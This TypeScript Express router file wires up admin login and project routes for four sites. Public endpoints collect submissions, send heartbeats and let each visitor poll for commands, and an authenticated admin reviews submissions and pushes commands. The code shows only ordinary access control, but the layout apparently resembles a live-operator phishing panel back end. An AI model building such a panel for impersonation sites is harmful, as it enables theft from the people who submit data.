import { Router, type IRouter, type Request, type Response, type NextFunction } from "express";
import healthRouter from "./health";
import shamRouter from "./sham";
import tameeniRouter from "./tameeni";
import wiqayaRouter from "./wiqaya";
import unityRouter from "./unity";
import adminAuthRouter from "./admin-auth";
import adminProjectsRouter from "./admin-projects";
import { requireAuth } from "../middlewares/auth";

const router: IRouter = Router();

// ── Public health check ─────────────────────────────────────────────────────
router.use(healthRouter);

// ── Admin authentication (login / logout / me) ──────────────────────────────
router.use("/admin", adminAuthRouter);

// ── Admin project management (requires auth) ────────────────────────────────
router.use("/admin", adminProjectsRouter);

// ── Project routes ──────────────────────────────────────────────────────────
// Public endpoints (used by user-facing sites):
//   POST /submit, GET /cmd/:id, POST /heartbeat
// Protected endpoints (admin only):
//   GET /submissions, PATCH /submissions/:id, DELETE /submissions/:id,
//   DELETE /submissions, POST /cmd/:id

function protectAdmin(prefix: string, subRouter: IRouter) {
  // Intercept admin-only verbs/paths before delegating to the sub-router
  const guard = Router();
  guard.get(    "/submissions",     requireAuth, (req, res, next) => next("router"));
  guard.patch(  "/submissions/:id", requireAuth, (req, res, next) => next("router"));
  guard.delete( "/submissions/:id", requireAuth, (req, res, next) => next("router"));
  guard.delete( "/submissions",     requireAuth, (req, res, next) => next("router"));
  guard.post(   "/cmd/:id",         requireAuth, (req, res, next) => next("router"));
  guard.post(   "/cmd",             requireAuth, (req, res, next) => next("router"));
  router.use(prefix, guard);
  router.use(prefix, subRouter);
}

protectAdmin("/unity",   unityRouter   as IRouter);
protectAdmin("/sham",    shamRouter    as IRouter);
protectAdmin("/tameeni", tameeniRouter as IRouter);
protectAdmin("/wiqaya",  wiqayaRouter  as IRouter);

export default router;
